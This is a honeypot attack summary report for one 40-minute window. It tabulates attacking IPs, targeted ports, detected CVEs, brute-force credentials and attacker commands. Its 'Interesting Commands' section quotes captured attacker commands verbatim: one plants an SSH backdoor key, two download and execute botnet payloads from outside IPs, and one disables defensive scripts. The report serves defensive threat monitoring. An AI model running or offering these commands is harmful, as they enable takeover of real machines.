
# Honeypot Attack Summary Report

## 1. Report Information

- **Report ID:** `a711a3e8-8b43-4a74-8255-08e1a7201c80`
- **Generation Date (UTC):** `2025-09-29T14-01-26Z`
- **Reporting Period:** `2025-09-29T13:20:01Z` to `2025-09-29T14:00:01Z`
- **Log Files Analyzed:**
  - `agg_log_20250929T132001Z.json`
  - `agg_log_20250929T134001Z.json`
  - `agg_log_20250929T140001Z.json`

## 2. Executive Summary

This report summarizes the findings from three recent honeypot log files, spanning a period of approximately 40 minutes. A total of **12,957** malicious events were recorded across a distributed network of honeypots. The majority of these attacks were captured by the **Cowrie** honeypot, indicating a high volume of SSH and Telnet-based brute-force attacks and command-line activity. The **Suricata** IDS also detected a significant number of network-based attacks, including reconnaissance and exploit attempts.

The most prominent attacking IP address was **134.199.202.5**, which was responsible for a significant portion of the observed traffic. The most frequently targeted ports were **22 (SSH)** and **445 (SMB)**, which are common vectors for remote access and file-sharing exploits.

A variety of CVEs were observed, with **CVE-2021-44228 (Log4Shell)** being the most frequently detected vulnerability. This indicates that attackers are still actively attempting to exploit this critical remote code execution vulnerability.

Attackers were observed using a variety of common usernames and passwords, such as `root`, `admin`, `postgres`, and `test`, with simple passwords. A number of post-exploitation commands were also recorded, including reconnaissance commands (`uname`, `whoami`, `lscpu`) and attempts to download and execute malicious payloads.

## 3. Detailed Analysis

### 3.1. Attacks by Honeypot

The following table provides a breakdown of the total number of attacks recorded by each honeypot:

| Honeypot        | Attack Count |
|-----------------|--------------|
| Cowrie          | 5942         |
| Suricata        | 2832         |
| Honeytrap       | 2248         |
| Ciscoasa        | 1444         |
| Adbhoney        | 77           |
| Dionaea         | 98           |
| ConPot          | 74           |
| H0neytr4p       | 69           |
| Tanner          | 30           |
| Miniprint       | 28           |
| ElasticPot      | 23           |
| Dicompot        | 24           |
| Sentrypeer      | 23           |
| Redishoneypot   | 15           |
| Mailoney        | 13           |
| Honeyaml        | 9            |
| Ipphoney        | 6            |

### 3.2. Top 20 Attacking IP Addresses

The following table lists the top 20 IP addresses with the highest number of attacks:

| IP Address        | Attack Count |
|-------------------|--------------|
| 134.199.202.5     | 2173         |
| 181.115.175.122   | 1405         |
| 45.78.224.98      | 749          |
| 4.247.148.24      | 933          |
| 61.80.237.194     | 378          |
| 185.156.73.166    | 374          |
| 185.156.73.167    | 371          |
| 92.63.197.55      | 362          |
| 203.6.232.223     | 263          |
| 92.63.197.59      | 337          |
| 14.224.199.187    | 266          |
| 107.174.26.130    | 232          |
| 152.32.129.236    | 163          |
| 211.253.10.96     | 158          |
| 190.34.200.34     | 115          |
| 188.246.224.87    | 102          |
| 74.243.210.62     | 120          |
| 3.130.96.91       | 71           |
| 172.245.163.134   | 62           |
| 3.131.215.38      | 49           |

### 3.3. Top 20 Targeted Ports

The following table lists the top 20 ports targeted by attackers:

| Port      | Attack Count |
|-----------|--------------|
| 22        | 1050         |
| 445       | 1445         |
| 8333      | 125          |
| 443       | 62           |
| 80        | 21           |
| 1025      | 31           |
| 9200      | 22           |
| 10001     | 38           |
| 5432      | 40           |
| 9100      | 20           |
| 30003     | 27           |
| 8728      | 40           |
| 5080      | 14           |
| 23        | 30           |
| 3001      | 25           |
| 8089      | 18           |
| 9090      | 14           |
| 8181      | 12           |
| 9000      | 29           |
| 5555      | 12           |

### 3.4. CVEs Exploited

The following CVEs were detected in the traffic analyzed:

- `CVE-2021-44228`
- `CVE-2019-11500`
- `CVE-2021-3449`
- `CVE-2002-0013`
- `CVE-2002-0012`
- `CVE-2005-4050`

### 3.5. Top 20 Credentials Used

The following table lists the top 20 most frequently used credentials by attackers:

| Username/Password         | Count |
|---------------------------|-------|
| 345gs5662d34/345gs5662d34  | 10    |
| root/nPSpP4PBW0           | 6     |
| root/redhat               | 5     |
| postgres/postgres         | 4     |
| root/Zy123456789          | 4     |
| root/1                    | 3     |
| root/Passw0rd             | 5     |
| test/test                 | 3     |
| hive/hive                 | 3     |
| tom/tom                   | 3     |
| appuser/appuser           | 3     |
| esuser/esuser             | 3     |
| flask/flask               | 3     |
| root/3245gs5662d34        | 3     |
| root/root123              | 5     |
| minecraft/minecraft       | 3     |
| ubuntu/1qazxsw2           | 2     |
| www/abc123                | 2     |
| root/qwerty123            | 2     |
| test/abc123               | 2     |

### 3.6. Top 20 Common Commands Executed

The following table lists the top 20 most frequently executed commands:

| Command                                                                 | Count |
|-------------------------------------------------------------------------|-------|
| `uname -s -v -n -r -m`                                                  | 10    |
| `uname -a`                                                              | 14    |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                  | 12    |
| `lockr -ia .ssh`                                                        | 12    |
| `cat /proc/cpuinfo | grep name | wc -l`                                 | 12    |
| `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` | 12    |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`             | 12    |
| `ls -lh $(which ls)`                                                     | 12    |
| `which ls`                                                              | 12    |
| `crontab -l`                                                            | 12    |
| `w`                                                                     | 12    |
| `uname -m`                                                              | 12    |
| `cat /proc/cpuinfo | grep model | grep name | wc -l`                   | 12    |
| `top`                                                                   | 12    |
| `uname`                                                                 | 12    |
| `whoami`                                                                | 11    |
| `Enter new UNIX password: `                                             | 8     |
| `Enter new UNIX password:`                                              | 5     |
| `rm -rf /data/local/tmp/*`                                              | 4     |
| `lscpu | grep Model`                                                    | 7     |

### 3.7. Interesting Commands

The following is a list of interesting commands that may indicate more sophisticated attacks:

- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android;`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `cd /data/local/tmp/; busybox wget http://161.97.149.138/w.sh; sh w.sh; curl http://161.97.149.138/c.sh; sh c.sh; wget http://161.97.149.138/wget.sh; sh wget.sh;`

## 4. Notes and Limitations

- This report is based on data collected from a distributed network of honeypots. The data may not be representative of all malicious activity on the internet.
- The data is presented as recorded by the honeypots and has not been independently verified.
- The report is intended for informational purposes only and should not be used to make decisions about security policy without further analysis.
- The classification of attacks is based on the signatures and heuristics of the honeypot software and may not be completely accurate.
- The list of CVEs is based on signatures and may contain false positives.
